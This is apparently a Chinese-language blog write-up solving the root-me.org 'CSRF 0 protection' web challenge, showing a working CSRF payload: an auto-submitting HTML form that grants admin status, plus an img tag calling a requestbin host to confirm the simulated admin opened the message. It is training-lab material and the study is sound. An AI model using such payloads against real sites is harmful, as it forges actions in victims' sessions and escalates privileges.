---
title: root-me.org Client CSRF 0 protection
key: 20190413
tags: ctf infosec root-me.org
---

玩root-me.org，这条卡壳了，网上搜了半天都没有正确的解法，中文的那几个都是乱翻译一个德语的教程，根本用不了，估计自己都没试过。

地址： https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-protection 

lab地址： http://challenge01.root-me.org/web-client/ch22/ 

![](https://cdn.discordapp.com/attachments/447635828496138241/594635890328993814/p59863980.png)

<!--more-->

进去之后是这个界面，先随便register，再login

![](https://cdn.discordapp.com/attachments/447635828496138241/594635963381055498/p59863990.png)

出现profile界面，status是灰色的，这是只有管理员才有的权限，这个lab解谜的关键就是bypass这个地方

![](https://cdn.discordapp.com/attachments/447635828496138241/594636075977146369/p59864042.png)


这时候想到直接在chrome里点f12修改elements，把 `<input type="checkbox" name="status" disabled>` 改成 `<input type="checkbox" name="status" value="on">` ，想当然了

![](https://cdn.discordapp.com/attachments/447635828496138241/594636165831720970/p59864058.png)

虽然可以打勾了，点submit还是提示不行

![](https://cdn.discordapp.com/attachments/447635828496138241/594636269171113994/p59864076.png)


于是就和标题说的一样，得尝试CSRF攻击了，刚好目录里有个contact

先去网上找个免费的**requestbin**，我用了这个 https://requestbin.fullcontact.com/ 

新建了一个requestbin，打算放到 `<img src = " ">` 里面让服务器执行

基本的思路就是构建让admin打开收件箱之后到http://challenge01.root-me.org/web-client/ch22/?action=profile 这个界面，然后自动执行对攻击者账号的validation的POST界面。

查看/?action=profile界面的源代码，抄一下

![](https://cdn.discordapp.com/attachments/447635828496138241/594636397277741056/p59864214.png)

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF</title>
</head>
<body>
    <form name="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="username" value="test" />
    <input type="hidden" name="status" value="on" />
    <button type="submit">Submit</button>
    </form>
    <script>document.csrf.submit()</script>
    <img src=" https://requestbin.fullcontact.com/【生成地址不放了】?=">
</body>
</html>
```

img里填requestbin的地址

![](https://cdn.discordapp.com/attachments/447635828496138241/594636486159368192/p59864531.png)

到contact里面把这段复制到comment里，由于lab是模拟一个对CSRF没有防御的网站，所以一旦发送后服务器就会马上模拟管理员打开信件并自动执行代码

![](https://cdn.discordapp.com/attachments/447635828496138241/594636680099790850/p59864490.png)

等了几十秒，查看requestbin发现服务器已经执行并访问了这个伪造的img地址

![](https://cdn.discordapp.com/attachments/447635828496138241/594636773133647892/p59864509.png)

点进private，成功拿到flag
